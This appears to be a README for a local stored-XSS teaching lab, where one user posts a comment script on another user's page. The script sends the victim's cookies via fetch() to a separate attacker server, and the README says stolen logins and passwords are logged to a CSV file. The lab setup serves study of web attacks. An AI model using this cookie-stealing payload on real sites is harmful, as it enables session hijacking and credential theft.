# Stored-XSS Server
1) To run server:
setup new venv or install directly in python folder
```cmd
(optional) .venv\Scripts\activate
pip install -r requirements.txt
python server.py
python attacker_server.py
```
2) Open http://127.0.0.1 or http://localhost
3) Register 2 new users (e.g. Alice and Bob)
4) Login as Alice, leave a comment on the Bob's page (script below):
```html
<script>
	alert("your cookies has been stolen");
	fetch("http://127.0.0.1:9000/steal?cookie=" + document.cookie);
</script>
```
5) Logout form Alice and login as Bob.
6) See the result in Terminal and stolen_credential.csv.
Note: You'll also see your own login and password in .csv-file.